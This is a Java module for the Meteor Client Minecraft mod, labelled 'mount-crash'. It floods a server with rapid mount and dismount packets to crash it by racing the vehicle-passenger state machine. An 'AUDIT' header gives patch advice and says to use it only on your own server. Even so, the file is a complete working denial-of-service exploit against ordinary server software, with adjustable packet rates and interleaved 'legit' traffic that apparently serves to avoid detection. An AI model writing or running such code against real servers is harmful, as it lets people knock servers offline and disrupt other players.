package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.PlayerInputC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.minecraft.util.PlayerInput;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.EntityHitResult;

/**
 * AUDIT: Mount / Dismount Crash
 *
 * Spams rapid dismount (START_SNEAKING / STOP_SNEAKING) and mount (interact)
 * packets while riding or looking at a rideable entity. The mount/dismount cycle
 * involves creating/destroying the vehicle-passenger relationship, updating entity
 * tracking, and recomputing bounding boxes for all involved entities. Rapid cycling
 * can expose state-machine gaps (passenger added while dismount is mid-flight) and
 * has caused CME-style crashes in past Paper builds.
 *
 * Patch signal: the mount state machine must be serialised per-vehicle and
 * per-player: reject mount requests while a dismount is pending (or vice-versa),
 * and enforce a per-tick rate limit on mount/dismount transitions.
 *
 * Ride or look at an entity, enable. Run against your OWN local server only.
 */
public class MountCrash extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
        .name("per-tick").description("Mount/dismount pairs per tick.")
        .defaultValue(50).range(1, 500).sliderRange(1, 200).build()
    );
    private final Setting<Boolean> interactToo = sgGeneral.add(new BoolSetting.Builder()
        .name("interact-too").description("Also send interact (mount) packets on the crosshair entity.")
        .defaultValue(true).build()
    );

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public MountCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "mount-crash",
            "Rapid mount/dismount packet spam. Tests mount state-machine atomicity and transition rate limiting.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0;
        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!cadence.shouldFire()) return;
        Entity vehicle = mc.player.getVehicle();
        Entity looked = (mc.crosshairTarget instanceof EntityHitResult ehr) ? ehr.getEntity() : null;

        for (int i = 0; i < perTick.get(); i++) {
            if (vehicle != null) {
                // PlayerInput sneak=true → dismount trigger; rapid sneak on/off cycles the dismount path
                mc.player.networkHandler.sendPacket(new PlayerInputC2SPacket(
                    new PlayerInput(false, false, false, false, false, true, false)));
                packetsSent++;
                mc.player.networkHandler.sendPacket(new PlayerInputC2SPacket(PlayerInput.DEFAULT));
                packetsSent++;
            }
            if (interactToo.get() && looked != null) {
                mc.player.networkHandler.sendPacket(
                    PlayerInteractEntityC2SPacket.interact(looked, mc.player.isSneaking(), Hand.MAIN_HAND));
                packetsSent++;
            }
        }
        if (vehicle == null && looked == null) warning("Ride something or look at a rideable entity.");
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
